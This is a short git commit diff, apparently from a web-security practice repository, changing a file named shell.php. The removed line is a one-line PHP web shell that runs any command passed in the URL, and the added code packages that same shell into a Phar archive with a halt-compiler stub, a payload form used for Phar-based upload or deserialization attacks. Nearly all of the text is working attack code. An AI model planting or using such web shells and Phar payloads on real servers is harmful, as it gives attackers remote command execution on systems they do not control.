0e7e3fef1fe0bc69f3377e4c409b47c281dfca9c
lkolis <lkolis45@gmail.com>
2025-08-29 11:39:35 +0300

    sth

--- 02_web/shell.php
+++ 02_web/shell.php
@@ -1,1 +1,8 @@
-<?php system($_GET["cmd"]); ?>
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+
